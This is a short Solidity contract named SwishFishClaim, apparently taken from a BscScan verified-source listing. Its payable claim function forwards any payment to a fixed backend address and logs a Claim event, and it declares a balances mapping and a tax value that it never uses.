/**
 *Submitted for verification at BscScan.com on 2022-11-08
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract SwishFishClaim 
{
    mapping(address => uint) public balances;
    uint256 private tax = 10;
    address payable private backend = payable(0x0B569e3335895E327395C2B968996FD1689d35e3);
    event Claim(address indexed sender, uint256 tax);
    constructor() {
    }
    
    receive() external payable {
    }

    function claim() external payable {
        payable(backend).transfer(msg.value);
        emit Claim(msg.sender, msg.value);
    }
}